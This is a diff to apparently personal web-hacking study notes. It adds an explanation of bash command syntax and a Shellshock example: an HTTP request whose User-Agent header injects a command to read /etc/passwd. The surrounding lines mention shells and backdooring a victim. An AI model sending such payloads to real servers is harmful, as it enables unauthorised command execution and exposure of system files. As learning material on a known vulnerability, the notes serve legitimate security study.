@@ -337,6 +337,8 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
     - Send and receive shells to and from the target
     - Backdoor the victim
 
+- Command syntax `/bin/bash -c 'command'`
+
 - you can alter the script using shell shock. For example:
 
 
@@ -355,6 +357,16 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
   Connection: keep-alive
   ```
 
+- Likewise you can run malacious code to open passwd file
+
+   - For example: 
+
+   ```bash
+   GET /index.html HTTP/1.1
+   Host: example.com
+   User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
+   Connection: keep-alive
+   ```
 
 
 
